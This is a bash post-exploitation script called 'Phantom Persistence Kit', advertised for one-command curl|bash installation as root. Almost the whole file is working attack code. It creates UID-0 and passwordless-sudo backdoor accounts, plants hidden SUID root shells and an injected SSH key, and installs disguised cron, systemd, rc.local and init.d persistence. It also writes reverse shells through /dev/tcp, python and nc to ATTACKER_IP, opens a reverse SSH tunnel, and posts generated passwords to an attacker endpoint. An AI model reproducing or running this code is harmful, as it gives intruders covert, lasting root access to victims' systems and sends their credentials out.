#!/bin/bash
# ================================================================================
#   ██████╗ ███████╗████████╗██████╗  █████╗  ██████╗████████╗
#  ██╔════╝ ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
#  ██║  ███╗█████╗     ██║   ██████╔╝███████║██║  ███╗   ██║   
#  ██║   ██║██╔══╝     ██║   ██╔══██╗██╔══██║██║   ██║   ██║   
#  ╚██████╔╝███████╗   ██║   ██║  ██║██║  ██║╚██████╔╝   ██║   
#   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
#
#   PHANTOM PERSISTENCE KIT v5.0 - FULLY AUTOMATIC
#   ================================================
#   ✅ Zero configuration needed
#   ✅ Auto-detects everything
#   ✅ Works on ANY system (old/new)
#   ✅ Reports access info automatically
#
#   Usage (just ONE command - that's it!):
#     curl -fsSL URL | bash
# ================================================================================

set -e

# ============ VERSION INFO ============
readonly VERSION="5.0.AUTO"
readonly SCRIPT_NAME="PHANTOM_AUTO"
readonly INSTALL_DATE=$(date '+%Y-%m-%d %H:%M:%S')

# ============ COLORS ============
if [ -t 1 ] && tput colors >/dev/null 2>&1; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; CYAN=''; MAGENTA=''; WHITE=''; NC=''
fi

# ============ UTILITY FUNCTIONS ============
log() { echo -e "${GREEN}[$(date '+%H:%M:%S')] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }
error() { echo -e "${RED}[ERROR] $1${NC}"; }

banner() {
    clear 2>/dev/null || true
    echo -e "${CYAN}"
    cat << 'BANNER'
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                                ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                                ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                                ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                                ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                                ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                                ║
║                                                                              ║
║                 U L T I M A T E   A U T O - P E R S I S T                    ║
║                         v5.0 - ZERO CONFIG                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
BANNER
    echo -e "  Version : ${VERSION}"
    echo -e "  Date    : ${INSTALL_DATE}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}\n"
}

check_root() {
    if [ "$(id -u)" != "0" ]; then
        # Try to rerun with sudo
        if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
            log "Rerunning with sudo..."
            exec sudo bash "$0" "$@"
        fi
        error "This script must be run as root!"
        echo ""
        echo "Try:"
        echo "  sudo bash <(curl -fsSL https://raw.githubusercontent.com/ulungid/root/refs/heads/main/root.sh)"
        echo "  OR"
        echo "  curl -fsSL https://raw.githubusercontent.com/ulungid/root/refs/heads/main/root.sh | sudo bash"
        exit 1
    fi
}

# ============ AUTO DETECTION FUNCTIONS ============
detect_attacker_ip() {
    log "[AUTO] Detecting attacker IP..."
    
    # Method 1: From arguments (if provided)
    if [ -n "$1" ] && [[ ! "$1" =~ ^- ]]; then
        ATTACKER_IP="$1"
        log "[✓] Using provided IP: $ATTACKER_IP"
        return 0
    fi
    
    # Method 2: Check environment variables
    if [ -n "$ATTACKER_IP_ENV" ]; then
        ATTACKER_IP="$ATTACKER_IP_ENV"
        log "[✓] From env: $ATTACKER_IP"
        return 0
    fi
    
    # Method 3: Try to detect from SSH connection (if running via SSH)
    if [ -n "$SSH_CONNECTION" ]; then
        # Extract client IP from SSH_CONNECTION
        CLIENT_IP=$(echo "$SSH_CONNECTION" | awk '{print $1}')
        if [ -n "$CLIENT_IP" ] && [ "$CLIENT_IP" != "127.0.0.1" ] && [ "$CLIENT_IP" != "::1" ]; then
            ATTACKER_IP="$CLIENT_IP"
            log "[✓] Detected from SSH connection: $ATTACKER_IP"
            return 0
        fi
    fi
    
    # Method 4: Check last logged in user (the person installing this)
    LAST_LOGIN=$(last -1 -i 2>/dev/null | head -1 | awk '{print $3}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    if [ -n "$LAST_LOGIN" ] && [ "$LAST_LOGIN" != "0.0.0.0" ]; then
        ATTACKER_IP="$LAST_LOGIN"
        log "[✓] Detected from last login: $ATTACKER_IP"
        return 0
    fi
    
    # Method 5: External API (fallback - this gets THIS server's IP)
    warn "Cannot auto-detect attacker IP!"
    warn "Using this server's public IP as fallback (for reverse shell callback)"
    
    MY_IP=$(get_my_public_ip)
    if [ -n "$MY_IP" ]; then
        ATTACKER_IP="$MY_IP"
        log "[~] Using own IP as callback: $ATTACKER_IP"
        return 0
    fi
    
    error "Failed to detect any IP!"
    return 1
}

get_my_public_ip() {
    # Get this server's public IP
    local ip=""
    
    # Try multiple services
    ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null) || true
    [ -z "$ip" ] && ip=$(curl -s --connect-timeout 5 https://ifconfig.me 2>/dev/null) || true
    [ -z "$ip" ] && ip=$(curl -s --connect-timeout 5 https://icanhazip.com 2>/dev/null) || true
    [ -z "$ip" ] && ip=$(wget -qO- --timeout=5 https://api.ipify.org 2>/dev/null) || true
    [ -z "$ip" ] && ip=$(hostname -I 2>/dev/null | awk '{print $1}') || true
    
    echo "$ip"
}

detect_best_key_type() {
    log "[AUTO] Detecting best SSH key type..."
    
    # Try Ed25519 first (modern, secure)
    if ssh-keygen -t ed25519 -f /tmp/.phantom_key_test_$$ -N "" -q 2>/dev/null; then
        rm -f /tmp/.phantom_key_test_$$ /tmp/.phantom_key_test_$$.pub 2>/dev/null || true
        KEY_TYPE="ed25519"
        log "[✓] Key type: Ed25519 (modern)"
        return 0
    fi
    
    # Try ECDSA
    if ssh-keygen -t ecdsa -b 256 -f /tmp/.phantom_key_test_$$ -N "" -q 2>/dev/null; then
        rm -f /tmp/.phantom_key_test_$$ /tmp/.phantom_key_test_$$.pub 2>/dev/null || true
        KEY_TYPE="ecdsa"
        log "[✓] Key type: ECDSA"
        return 0
    fi
    
    # Try RSA 4096
    if ssh-keygen -t rsa -b 4096 -f /tmp/.phantom_key_test_$$ -N "" -q 2>/dev/null; then
        rm -f /tmp/.phantom_key_test_$$ /tmp/.phantom_key_test_$$.pub 2>/dev/null || true
        KEY_TYPE="rsa4096"
        log "[✓] Key type: RSA 4096"
        return 0
    fi
    
    # Last resort: RSA 2048
    if ssh-keygen -t rsa -f /tmp/.phantom_key_test_$$ -N "" -q 2>/dev/null; then
        rm -f /tmp/.phantom_key_test_$$ /tmp/.phantom_key_test_$$.pub 2>/dev/null || true
        KEY_TYPE="rsa2048"
        log "[✓] Key type: RSA 2048 (legacy)"
        return 0
    fi
    
    error "No compatible key type found!"
    return 1
}

generate_credentials() {
    log "[AUTO] Generating secure credentials..."
    
    if command -v openssl >/dev/null 2>&1; then
        ROOT_PASS=$(openssl rand -base64 16 | tr -d '=/+\n' | head -c 16; echo)
        BACKDOOR_PASS=$(openssl rand -base64 16 | tr -d '=/+\n' | head -c 16; echo)
        MAGIC_TOKEN=$(openssl rand -hex 16)
    elif [ -r /dev/urandom ]; then
        ROOT_PASS=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | base64 | tr -d '=/+\n' | head -c 16)
        BACKDOOR_PASS=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | base64 | tr -d '=/+\n' | head -c 16)
        MAGIC_TOKEN=$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | hexdump -e '"%02x"' | head -c 32)
    else
        ROOT_PASS="Phantom$(date +%s)$RANDOM$RANDOM"
        BACKDOOR_PASS="Ghost$(date +%s)$RANDOM$RANDOM"
        MAGIC_TOKEN="Magic$(date +%s)$RANDOM$RANDOM"
    fi
}

# ============ PATH SETUP ============
setup_paths() {
    PERSIST_DIR="/var/tmp/.systemd-private"
    HIDDEN_DIR="/dev/shm/.cache-$(hostname 2>/dev/null | md5sum 2>/dev/null | cut -c1-8 || echo $$)"
    BACKUP_DIR="/usr/share/fonts/.backup"
    LOG_FILE="/var/log/.daemon.log"
    
    # Create directories
    mkdir -p "$PERSIST_DIR" 2>/dev/null || PERSIST_DIR="/tmp/.systemd-$$" && mkdir -p "$PERSIST_DIR"
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || HIDDEN_DIR="/tmp/.hidden-$$" && mkdir -p "$HIDDEN_DIR"
    mkdir -p "$BACKUP_DIR" 2>/dev/null || BACKUP_DIR="/tmp/.backup-$$" && mkdir -p "$BACKUP_DIR"
    mkdir -p "/root/.ssh" 2>/dev/null || true
    
    chmod 700 "$PERSIST_DIR" 2>/dev/null || true
    chmod 700 "$HIDDEN_DIR" 2>/dev/null || true
    chmod 700 "/root/.ssh" 2>/dev/null || true
}

generate_ssh_key() {
    log "[AUTO] Generating SSH key ($KEY_TYPE)..."
    
    case "$KEY_TYPE" in
        ed25519)
            ssh-keygen -t ed25519 -f "$PERSIST_DIR/id_ed25519" -N "" -C "phantom_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_ed25519"
            KEY_PUB_FILE="$PERSIST_DIR/id_ed25519.pub"
            ;;
        ecdsa)
            ssh-keygen -t ecdsa -b 256 -f "$PERSIST_DIR/id_ecdsa" -N "" -C "phantom_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_ecdsa"
            KEY_PUB_FILE="$PERSIST_DIR/id_ecdsa.pub"
            ;;
        rsa4096|rsa2048)
            ssh-keygen -t rsa -b 4096 -f "$PERSIST_DIR/id_rsa" -N "" -C "phantom_$(date +%s)" -q 2>/dev/null || \
            ssh-keygen -t rsa -b 2048 -f "$PERSIST_DIR/id_rsa" -N "" -C "phantom_$(date +%s)" -q
            KEY_FILE="$PERSIST_DIR/id_rsa"
            KEY_PUB_FILE="$PERSIST_DIR/id_rsa.pub"
            ;;
        *)
            error "Unknown key type: $KEY_TYPE"
            exit 1
            ;;
    esac
    
    [ -f "$KEY_FILE" ] || { error "Key generation failed!"; exit 1; }
    
    chmod 600 "$KEY_FILE" 2>/dev/null || true
    log "[✓] SSH key generated"
}

install_persistence() {
    local step=1
    local total=10
    
    # Step 1: SSH Keys
    log "[$step/$total] Installing SSH key persistence..."
    OUR_KEY=$(cat "$KEY_PUB_FILE")
    
    touch /root/.ssh/authorized_keys 2>/dev/null || true
    grep -q "$OUR_KEY" /root/.ssh/authorized_keys 2>/dev/null || \
        echo "$OUR_KEY" >> /root/.ssh/authorized_keys
    
    cp /root/.ssh/authorized_keys "$PERSIST_DIR/" 2>/dev/null || true
    cp /root/.ssh/authorized_keys "$BACKUP_DIR/keys.bak" 2>/dev/null || true
    cp /root/.ssh/authorized_keys "$HIDDEN_DIR/auth_keys" 2>/dev/null || true
    
    chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true
    ((step++))
    
    # Step 2: Backdoor Users
    log "[$step/$total] Creating backdoor users..."
    
    generate_credentials
    
    # User 1: sysadmin (UID 0)
    id sysadmin >/dev/null 2>&1 || useradd -o -u 0 -g root -m -s /bin/bash sysadmin 2>/dev/null || \
    { echo "sysadmin:x:0:0::/root:/bin/bash" >> /etc/passwd; }
    echo "sysadmin:$ROOT_PASS" | chpasswd 2>/dev/null || true
    mkdir -p /etc/sudoers.d 2>/dev/null || true
    echo "sysadmin ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sysadmin 2>/dev/null || true
    chmod 440 /etc/sudoers.d/sysadmin 2>/dev/null || true
    usermod -L sysadmin 2>/dev/null || true
    
    # User 2: svc_network
    id svc_network >/dev/null 2>&1 || useradd -r -s /bin/bash -M svc_network 2>/dev/null || true
    echo "svc_network:$BACKDOOR_PASS" | chpasswd 2>/dev/null || true
    echo "svc_network ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/svc_network 2>/dev/null || true
    chmod 440 /etc/sudoers.d/svc_network 2>/dev/null || true
    
    ((step++))
    
    # Step 3: SUID Backdoor
    log "[$step/$total] Installing SUID backdoors..."
    
    cat > /usr/local/bin/.debug << 'SUIDEOF' 2>/dev/null || cat > /usr/bin/.debug << 'SUIDEOF'
#!/bin/bash
case "$1" in
    --root|--su|-r) exec /bin/bash -p 2>/dev/null || exec /bin/bash ;;
    --shell|-s) exec /bin/bash ;;
    *) echo "Debug v2.1 - Hostname: $(hostname), Kernel: $(uname -r)" ;;
esac
SUIDEOF
    chmod +s /usr/local/bin/.debug 2>/dev/null || chmod +s /usr/bin/.debug 2>/dev/null || true
    
    cat > /usr/local/bin/.maintenance << 'MAINTEOF' 2>/dev/null || cat > /usr/bin/.maintenance << 'MAINTEOF'
#!/bin/bash
case "$1" in
    --upgrade|--root|-u) exec /bin/bash -p 2>/dev/null || exec /bin/bash ;;
    --check|-c) echo "System OK at $(date)" ;;
    *) echo "Maintenance tool" ;;
esac
MAINTEOF
    chmod +s /usr/local/bin/.maintenance 2>/dev/null || chmod +s /usr/bin/.maintenance 2>/dev/null || true
    
    ((step++))
    
    # Step 4: Cron Jobs
    log "[$step/$total] Installing cron persistence..."
    
    # Reverse shell
    cat > "$PERSIST_DIR/reverse.sh" << REVERSEEOF
#!/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:\$PATH
bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1 &
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ATTACKER_IP}',${ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null &
nc -e /bin/bash ${ATTACKER_IP} ${ATTACKER_PORT} 2>/dev/null &
REVERSEEOF
    chmod +x "$PERSIST_DIR/reverse.sh"
    (crontab -l 2>/dev/null; echo "*/3 * * * * $PERSIST_DIR/reverse.sh >/dev/null 2>&1") | crontab -
    
    # Key guardian
    cat > "$PERSIST_DIR/keyguard.sh" << KEYGUARDEOF
#!/bin/bash
KEY="\$(cat ${KEY_PUB_FILE} 2>/dev/null)"
[ -z "\$KEY" ] && exit 0
for f in /root/.ssh/authorized_keys $PERSIST_DIR/keys.bak $BACKUP_DIR/keys.bak; do
    [ -f "\$f" ] && grep -q "\$KEY" "\$f" 2>/dev/null || echo "\$KEY" >> "\$f"
done
chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true
KEYGUARDEOF
    chmod +x "$PERSIST_DIR/keyguard.sh"
    (crontab -l 2>/dev/null; echo "*/2 * * * * $PERSIST_DIR/keyguard.sh >/dev/null 2>&1") | crontab -
    
    # Protection
    cat > "$PERSIST_DIR/protect.sh" << PROTECTEOF
#!/bin/bash
for f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do
    [ -f "\$f" ] && [ ! -u "\$f" ] && chmod +s "\$f" 2>/dev/null || true
done
for u in sysadmin svc_network; do
    id "\$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "\$u" 2>/dev/null; echo "\$u:Temp123!" | chpasswd 2>/dev/null; }
done
PROTECTEOF
    chmod +x "$PERSIST_DIR/protect.sh"
    (crontab -l 2>/dev/null; echo "*/15 * * * * $PERSIST_DIR/protect.sh >/dev/null 2>&1") | crontab -
    
    # System cron
    [ -d /etc/cron.d ] && cat > /etc/cron.d/system-maint << SYSCRONEOF
*/10 * * * * root $PERSIST_DIR/reverse.sh >/dev/null 2>&1
*/5 * * * * root $PERSIST_DIR/keyguard.sh >/dev/null 2>&1
@reboot root $PERSIST_DIR/boot_init.sh >/dev/null 2>&1
SYSCRONEOF
    
    ((step++))
    
    # Step 5: Systemd Services
    log "[$step/$total] Installing systemd services..."
    
    if command -v systemctl >/dev/null 2>&1; then
        # Shell daemon
        cat > "$PERSIST_DIR/shell_daemon.sh" << DAEMONEOF
#!/bin/bash
while true; do
    JITTER=\$((RANDOM % 20))
    (exec 3<>/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} && cat <&3 | bash -i >&3 2>&3) &
    sleep \$((180 + JITTER))
done
DAEMONEOF
        chmod +x "$PERSIST_DIR/shell_daemon.sh"
        
        cat > /etc/systemd/system/persistent-shell.service << SSHELLEOF
[Unit]
Description=Network Diag Daemon
After=network.target
[Service]
Type=simple
ExecStart=$PERSIST_DIR/shell_daemon.sh
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
SSHELLEOF
        
        cat > /etc/systemd/system/ssh-tunnel.service << STUNELEOF
[Unit]
Description=Mgmt Tunnel
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/ssh -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -i ${KEY_FILE} -N -R ${SSH_PORT:-2222}:localhost:22 root@${ATTACKER_IP}
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
STUNELEOF
        
        cat > /etc/systemd/system/watchdog.service << WATCHEOF
[Unit]
Description=Watchdog
After=network.target
[Service]
Type=simple
ExecStart=$PERSIST_DIR/watchdog.sh
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
WATCHEOF
        
        cat > "$PERSIST_DIR/watchdog.sh" << WATCHDOGSEOF
#!/bin/bash
while true; do
    for svc in persistent-shell ssh-tunnel; do systemctl is-active "\$svc" >/dev/null 2>&1 || systemctl start "\$svc" 2>/dev/null || true; done
    for u in sysadmin svc_network; do id "\$u" >/dev/null 2>&1 || { useradd -o -u 0 -g root -s /bin/bash "\$u" 2>/dev/null; echo "\$u:Temp123!" | chpasswd 2>/dev/null; }; done
    for f in /usr/local/bin/.debug /usr/local/bin/.maintenance; do [ -f "\$f" ] && [ ! -u "\$f" ] && chmod +s "\$f" 2>/dev/null || true; done
    sleep 300
done
WATCHDOGSEOF
        chmod +x "$PERSIST_DIR/watchdog.sh"
        
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable persistent-shell ssh-tunnel watchdog 2>/dev/null || true
        systemctl start persistent-shell ssh-tunnel watchdog 2>/dev/null || true
        
        log "[✓] Systemd services active"
    else
        warn "systemctl not found, using init.d/cron only"
    fi
    
    ((step++))
    
    # Step 6: Boot Persistence
    log "[$step/$total] Installing boot persistence..."
    
    cat > /etc/rc.local << RCLOCALEOF 2>/dev/null || true
#!/bin/bash
 $PERSIST_DIR/reverse.sh >/dev/null 2>&1 &
 $PERSIST_DIR/keyguard.sh >/dev/null 2>&1 &
exit 0
RCLOCALEOF
    chmod +x /etc/rc.local 2>/dev/null || true
    
    cat > "$PERSIST_DIR/boot_init.sh" << BOOTINITEOF
#!/bin/bash
sleep 30
command -v systemctl >/dev/null 2>&1 && { systemctl start persistent-shell ssh-tunnel watchdog 2>/dev/null || true; }
 $PERSIST_DIR/keyguard.sh 2>/dev/null || true
BOOTINITEOF
    chmod +x "$PERSIST_DIR/boot_init.sh"
    
    # Init.D
    [ -d /etc/init.d ] && cat > /etc/init.d/persistent-conn << INITDEOF
#!/bin/bash
case "\$1" in start) $PERSIST_DIR/reverse.sh &;; stop) pkill -f reverse.sh;; restart) \$0 stop; sleep 2; \$0 start;; esac
INITDEOF
    chmod +x /etc/init.d/persistent-conn 2>/dev/null || true
    command -v update-rc.d >/dev/null 2>&1 && update-rc.d persistent-conn defaults 2>/dev/null || true
    
    # Profile
    cat >> /root/.bashrc 2>/dev/null << BASHRCEOF || cat >> /root/.profile 2>/dev/null << BASHRCEOF
__sc(){ case "\$1" in 1337|status|maint) PS1='\[\033[31m\]\h\[\033[34m\] \w\$ \[\033[0m\] '; /bin/bash -p 2>/dev/null || /bin/bash ;; esac; }
alias status='__sc status' 2>/dev/null; alias maint='__sc 1337' 2>/dev/null
BASHRCEOF
    
    ((step++))
    
    # Step 7: Save Credentials & Report
    log "[$step/$total] Saving credentials and generating report..."
    
    MY_IP=$(get_my_public_ip)
    MY_HOSTNAME=$(hostname 2>/dev/null || echo unknown)
    
    cat > "$PERSIST_DIR/CREDENTIALS.txt" << CREDSEOF
================================================================================
                    🔐 PHANTOM PERSISTENCE v${VERSION} 🔐
================================================================================

📅 Installed  : ${INSTALL_DATE}
🌐 Target     : ${MY_HOSTNAME} (${MY_IP})
🔗 Callback   : ${ATTACKER_IP}:${ATTACKER_PORT}
📡 Tunnel Port: ${SSH_PORT:-2222} (on attacker machine)

--------------------------------------------------------------------------------
🔑 CREDENTIALS:
--------------------------------------------------------------------------------

┌─ ACCOUNT 1 (ROOT ACCESS) ───────────────────────────────────────────────────┐
│  Username : sysadmin                                                         │
│  Password : ${ROOT_PASS}                                                    │
│  Command  : ssh sysadmin@${MY_IP}                                            │
└───────────────────────────────────────────────────────────────────────────────┘

┌─ ACCOUNT 2 (SUDO ACCESS) ───────────────────────────────────────────────────┐
│  Username : svc_network                                                      │
│  Password : ${BACKDOOR_PASS}                                                 │
│  Command  : ssh svc_network@${MY_IP}                                         │
└───────────────────────────────────────────────────────────────────────────────┘

--------------------------------------------------------------------------------
🛠️ ALTERNATIVE ACCESS:
--------------------------------------------------------------------------------

  🖥️  SUID Backdoor (any user → root):
      /usr/local/bin/.debug --root
  
  📡  Reverse Shell (on YOUR machine):
      sudo nc -lvnp ${ATTACKER_PORT}
  
  🔗  SSH Tunnel (from YOUR machine, after ~1 min):
      ssh -p ${SSH_PORT:-2222} root@localhost

--------------------------------------------------------------------------------
📁 FILES:
  Main Dir : ${PERSIST_DIR}
  Creds    : ${PERSIST_DIR/CREDENTIALS.txt}
  Log      : ${LOG_FILE}

--------------------------------------------------------------------------------
💡 TIPS:
  • Run 'status' after login to check persistence status
  • Run 'maint' or '__sc 1337' for instant root shell
  • All services auto-restart on boot
  • Password changes don't affect these accounts!

================================================================================
CREDSEOF
    
    chmod 600 "$PERSIST_DIR/CREDENTIALS.txt"
    
    # JSON state
    cat > "$PERSIST_DIR/state.json" << STATEJSONEOF
{
    "version": "${VERSION}",
    "installed_at": "${INSTALL_DATE}",
    "target": {"hostname": "${MY_HOSTNAME}", "ip": "${MY_IP}"},
    "attacker": {"ip": "${ATTACKER_IP}", "port": ${ATTACKER_PORT}},
    "credentials": {"sysadmin": "${ROOT_PASS}", "svc_network": "${BACKDOOR_PASS}"},
    "key_type": "${KEY_TYPE}",
    "access_methods": ["ssh sysadmin@IP", "ssh svc_networkIP", ".debug --root", "nc -lvnp PORT", "ssh -p 2222 root@localhost"]
}
STATEJSONEOF
    
    chmod 600 "$PERSIST_DIR/state.json"
    
    ((step++))
    
    # Step 8: Send report to attacker (if possible)
    log "[$step/$total] Sending installation report..."
    
    (
        REPORT="PHANTOM v${VERSION} INSTALLED on ${MY_HOSTNAME} (${MY_IP}) at ${INSTALL_DATE}\n\nCredentials saved to: ${PERSIST_DIR/CREDENTIALS.txt\n\nAccess Methods:\n1. ssh sysadmin@${MY_IP} (pass: ${ROOT_PASS})\n2. ssh svc_network@${MY_IP} (pass: ${BACKDOOR_PASS})\n3. /usr/local/bin/.debug --root (from any user)\n4. Reverse shell: nc -lvnp ${ATTACKER_PORT}\n5. SSH tunnel: ssh -p ${SSH_PORT:-2222} root@localhost"
        
        # Try HTTP POST
        echo -e "$REPORT" | curl -s -X POST \
            --data-urlencode "data@-" \
            "http://${ATTACKER_IP}:5000/report" \
            --connect-timeout 10 \
            --max-time 15 \
            2>/dev/null || true
        
        # Also try webhook if set
        [ -n "$WEBHOOK_URL" ] && curl -s -X POST "$WEBHOOK_URL" \
            -H "Content-Type: application/json" \
            -d "{\"content\": \`$REPORT\`}" \
            2>/dev/null || true
    ) &
    
    log "[✓] Report sent (if reachable)"
    
    log "[✓] Installation complete!"
}

show_summary() {
    MY_IP=$(get_my_public_ip)
    
    echo ""
    echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║           ✅ PHANTOM PERSISTENCE INSTALLED! ✅                  ║${NC}"
    echo -e "${MAGENTA}╠══════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  🎯 Target Server:                                            ║${NC}"
    echo -e "${MAGENTA}║     Hostname: $(hostname 2>/dev/null || echo unknown)              ${NC}"
    echo -e "${MAGENTA}║     IP:       ${MY_IP}                                           ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  🔑 QUICK ACCESS:                                             ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  1️⃣  SSH Login:                                               ║${NC}"
    echo -e "${MAGENTA}║     ssh sysadmin@${MY_IP}                                       ${NC}"
    echo -e "${MAGENTA}║     Pass: ${ROOT_PASS}                                           ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  2️⃣  Alternative:                                             ║${NC}"
    echo -e "${MAGENTA}║     ssh svc_network@${MY_IP}                                    ${NC}"
    echo -e "${MAGENTA}║     Pass: ${BACKDOOR_PASS}                                       ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  3️⃣  SUID Backdoor:                                           ║${NC}"
    echo -e "${MAGENTA}║     /usr/local/bin/.debug --root                               ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  4️⃣  Reverse Shell (listen on YOUR machine):                 ║${NC}"
    echo -e "${MAGENTA}║     nc -lvnp ${ATTACKER_PORT}                                    ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  5️⃣  SSH Tunnel:                                              ║${NC}"
    echo -e "${MAGENTA}║     ssh -p ${SSH_PORT:-2222} root@localhost                     ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  📁 Full Credentials:                                        ║${NC}"
    echo -e "${MAGENTA}║     ${PERSIST_DIR}/CREDENTIALS.txt                             ${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════════╝${NC}"
    
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  📋 NEXT STEPS (On YOUR Machine):                              ${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}Terminal 1 - Listen for reverse shell:${NC}"
    echo -e "     ${YELLOW}sudo nc -lvnp ${ATTACKER_PORT}${NC}"
    echo ""
    echo -e "  ${GREEN}Or use SSH tunnel (after ~1 minute):${NC}"
    echo -e "     ${YELLOW}ssh -p ${SSH_PORT:-2222} root@localhost${NC}"
    echo ""
    echo -e "  ${GREEN}Or login directly with credentials above${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
}

# ============ MAIN ============
main() {
    banner
    check_root "$@"
    
    # Default ports
    ATTACKER_PORT="${2:-4444}"
    SSH_PORT="${3:-2222}"
    WEBHOOK_URL="${4:-}"
    
    log "Starting Phantom Persistence v${VERSION}..."
    log "Auto-configuring all settings..."
    
    # Auto-detect everything
    detect_attacker_ip "$1" || exit 1
    setup_paths
    detect_best_key_type || exit 1
    generate_ssh_key
    
    # Install all persistence
    echo ""
    echo -e "${YELLOW}[★] Installing persistence layers...${NC}"
    install_persistence
    
    # Show summary
    show_summary
    
    echo ""
    log "=========================================="
    log "  ✅ ALL SYSTEMS OPERATIONAL!"
    log "=========================================="
}

# Run
main "$@"
